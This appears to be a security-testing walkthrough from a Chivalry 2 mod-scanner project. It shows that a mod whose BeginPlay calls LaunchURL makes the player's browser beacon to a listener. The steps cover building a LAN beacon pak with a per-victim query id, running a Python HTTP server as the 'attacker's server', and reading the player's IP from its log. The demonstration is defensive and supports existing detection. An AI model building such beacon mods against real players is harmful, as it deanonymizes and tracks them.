# IP-grab live test (demonstration, not a committed sample)

Shows that `LaunchURL` opening a REAL (non-loopback) URL makes the player's browser connect to the
attacker's server, leaking the player's IP + timestamp + user-agent — the deanonymization / recon
harm. Kept on YOUR OWN LAN so nothing touches the public internet. This is a demonstration you run;
the pak is NOT committed (it would bake in a machine-specific LAN IP).

## 1. Author a LAN-beacon LaunchURL mod (reuse the delivered pattern)

Easiest: duplicate the existing `PakCorpusLaunchUrlMod` actor (ArgonSDKModBase + BeginPlay ->
LaunchURL) into a new folder `Content/Mods/AgMods/PakCorpusIpGrab/PakCorpusIpGrab`, and set the
LaunchURL URL to YOUR machine's LAN IP + a tell-tale path, e.g.:

    http://<YOUR_LAN_IP>:8080/grabbed?who=chiv2player

(Your LAN IP (find it with ipconfig, e.g. 192.168.1.42) — confirm with `ipconfig` before you build, it can change.)
Add a `DA_ModMarker` so you can enable it from the menu. Compile + Save.

## 2. Build it (not committed)

Copy build_launch_url_delivered.ps1 to a local throwaway, point modRel at
`Mods/AgMods/PakCorpusIpGrab`, output name `zz_ip_grab.pak`. Or just hand-pak the cooked folder.
Do NOT add it to manifest.json / commit it (the LAN IP is machine-specific).

## 3. Run the listener (this is "the attacker's server")

On your machine, in a terminal:

    python -m http.server 8080

Leave it running. It logs every request line, including the connecting IP.

## 4. Live-test (offline / own server)

Install the pak (+ cloned .sig) into the Chiv2 Paks folder, launch via Unchained OFFLINE, enable
the mod, load a match. When the actor spawns, BeginPlay fires LaunchURL -> your browser opens to
`http://<LAN_IP>:8080/grabbed?who=chiv2player`.

## 5. What you should see (the proof)

In the `python -m http.server` terminal, a log line like:

    192.168.1.x - - [date] "GET /grabbed?who=chiv2player HTTP/1.1" 404 -

The connecting IP + the URL path the mod chose are now in the server's log. Against a public
attacker server, that would be your PUBLIC IP + whatever per-victim id the URL encoded. That is the
IP-grab / deanonymization harm, demonstrated safely on your LAN.

## 6. Teardown

Remove the pak + .sig from the Paks folder; stop the listener. The scanner already flags this exact
shape (launch_url flagged-active; hidden_mod if markerless) — this test just makes the HARM visible,
it is not a new detection case.
